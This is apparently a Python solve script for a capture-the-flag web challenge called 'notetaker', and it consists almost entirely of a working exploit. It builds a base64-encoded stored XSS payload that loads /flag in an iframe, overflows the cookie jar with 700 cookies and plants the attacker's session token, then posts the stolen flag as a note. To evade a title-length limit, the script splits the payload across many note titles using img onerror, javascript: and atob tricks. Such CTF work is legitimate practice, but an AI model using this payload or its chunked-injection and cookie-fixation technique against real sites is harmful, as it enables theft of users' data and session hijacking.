import base64
import requests
target = "http://localhost:8000"
target = "https://notetaker.chall.wwctf.com"
s = requests.Session()

s.post(f"{target}/register", data={
    "name": "test"
})
print(s.get(f"{target}/me").url.replace('localhost', 'web')+"?sort=asc")

token = s.cookies.get("token")
print(token)
payload = f"""
(function() {{
    const iframe = document.createElement('iframe');
    iframe.src = '/flag';
    document.body.appendChild(iframe);
    const form = document.createElement('form');
    form.id = 'flagForm';
    form.action = '/';
    form.method = 'POST';
    const ti = document.createElement('input');
    ti.name = 'title';
    ti.id = 'ti';
    ti.value = 'flag';
    const ci = document.createElement('input');
    ci.name = 'content';
    ci.value = 'dummy';
    form.appendChild(ti);
    form.appendChild(ci);
    document.body.appendChild(form);
    iframe.onload = () => {{
        try {{
            const flag = iframe.contentDocument.body.innerText;
            ci.value = '['+flag;
            for (let i = 0; i < 700; i++) {{
                document.cookie = `cookie${{i}}=${{i}}`;
            }}
            document.cookie = 'token={token}; SameSite=Lax; path=/';
            form.submit();
        }} catch (e) {{
            console.error('Error:', e);
        }}
    }};
}})();
""".strip()
payload = base64.b64encode(payload.encode()).decode()
max_l = 35
payload_chunks = [payload[i:i+max_l] for i in range(0, len(payload), max_l)]
#http://web:8000/user/37b74d40-9697-428f-b109-7ed00ef65451?sort=asc
s.post(target, data={
    "title": "a</a>\n\n*000<img id=\"",
    "content": "dummy"
})
s.post(target, data={
    "title": "\"a\n\n*001\" onerror='location=\"javascript:\"+/*",
    "content": "dummy"
})
s.post(target, data={
    "title": f"\"a\n\n*002*/atob(/*",
    "content": "dummy"
})
for i, chunk in enumerate(payload_chunks):
    s.post(target, data={
        "title": f"\"a\n\n*{(i+3):03d}*/\"{chunk}\"+/*",
        "content": "dummy"
    })
s.post(target, data={
    "title": "\"a\n\n*999*/\"\")' src='1'<img>",
    "content": "dummy"
})